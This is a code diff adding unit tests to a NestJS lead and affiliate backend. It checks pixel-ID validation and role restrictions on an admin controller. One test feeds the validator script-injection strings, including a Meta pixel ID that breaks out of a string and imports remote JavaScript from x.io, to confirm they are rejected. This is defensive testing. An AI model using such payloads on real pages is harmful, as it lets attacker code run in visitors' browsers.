@@ -14,6 +14,9 @@ import {
   LeadPreviousDto,
   LeadPriceDto,
   OperatorLeadListItemDto,
+  Role,
+  ROLES_KEY,
+  UpdateAffiliateStreamDto,
 } from '@app/common';
 import { of } from 'rxjs';
 import { AdminLeadsController } from './admin-leads.controller';
@@ -142,6 +145,35 @@ describe('Lid shartnomasi (BE-25)', () => {
     await expect(
       errorsIn(AdminLeadsQueryDto, { productId: 'abc', operatorId: '0' }),
     ).resolves.toEqual(['productId', 'operatorId']);
+  });
+
+  it('piksel ID: faqat raqam (Meta) va lotin harf/raqam (TikTok) — sahifaga skript kiritib bo‘lmaydi', async () => {
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: "1');import('//x.io/a.js');('",
+      }),
+    ).resolves.toEqual(['metaPixelId']);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, { tiktokPixelId: 'C4AB<script>' }),
+    ).resolves.toEqual(['tiktokPixelId']);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: '1234567890',
+        tiktokPixelId: 'C4ABC123XYZ',
+      }),
+    ).resolves.toEqual([]);
+    await expect(
+      errorsIn(UpdateAffiliateStreamDto, {
+        metaPixelId: '',
+        tiktokPixelId: '',
+      }),
+    ).resolves.toEqual([]);
+  });
+
+  it('admin offer matnlari faqat ADMIN va SUPERADMIN uchun', () => {
+    expect(Reflect.getMetadata(ROLES_KEY, AdminOfferContentController)).toEqual(
+      [Role.ADMIN, Role.SUPERADMIN],
+    );
   });
 
   it('telefon faqat +998 va 9 raqam', async () => {
